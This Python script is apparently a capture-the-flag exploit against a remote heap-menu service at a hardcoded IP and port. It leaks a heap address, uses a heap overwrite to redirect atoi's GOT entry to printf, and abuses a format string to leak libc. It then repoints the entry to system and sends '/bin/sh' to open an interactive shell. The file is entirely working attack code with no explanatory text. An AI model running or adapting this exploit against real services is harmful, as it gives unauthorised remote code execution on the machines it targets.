#!/usr/bin/env python
from sc_pwn import *

#target     = {'host':'192.168.75.129','port':8080}
target     = {'host':'104.199.132.199','port':1970}

addr_plt_printf         = 0x080484d0
addr_got_atoi           = 0x0804b03c

offset_libc_IO_stderr   = 0x001aa960
offset_libc_system      = 0x00040190

#==========
def attack(cmn):
    cmn.read_until('name:\n')
    cmn.send('a'*0x40)
    cmn.read(0x44)
    
    addr_heap  = cmn.read_until('! ')[:-2]
    addr_heap += '\x00'*(4-len(addr_heap))
    addr_heap  = unpack_32(addr_heap)-8

    info('addr_heap      : 0x%08x' % addr_heap)

    cmn.read_until('Org:\n')
    cmn.send('a'*0x40)
    cmn.read_until('Host:\n')
    cmn.sendln(pack_32(0xffffffff))

    New(cmn, addr_got_atoi-0x4-(addr_heap+0xe0)-0x8, None)
    
    exploit_st1  = pack_32(0xdeadbeef)
    exploit_st1 += pack_32(addr_plt_printf)
    New(cmn, 0x100, exploit_st1)

    cmn.read_until('>>\n')
    cmn.sendln('%24$p')
    addr_libc_IO_stderr = int(cmn.read(10),16)
    addr_libc_base      = addr_libc_IO_stderr - offset_libc_IO_stderr
    addr_libc_system    = addr_libc_base + offset_libc_system
    info('addr_libc_base : 0x%08x' % addr_libc_base)

    exploit_st2  = pack_32(0xdeadbeef)
    exploit_st2 += pack_32(addr_libc_system)
    
    Edit(cmn, 0, exploit_st2)
    
    cmn.read_until('>>\n')
    cmn.sendln('/bin/sh')

def New(cmn, size, data):
    cmn.read_until('>>\n')
    cmn.sendln('1')
    cmn.read_until('content:\n')
    cmn.sendln(str(size))
    cmn.read_until('content:\n')
    if size>0:
        cmn.sendln(data)

def Edit(cmn, id_num, data):
    cmn.read_until('>>\n')
    cmn.sendln('3  ')
    cmn.read_until('id:\n')
    cmn.sendln(str(id_num))
    cmn.read_until('content:\n')
    cmn.sendln(data)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
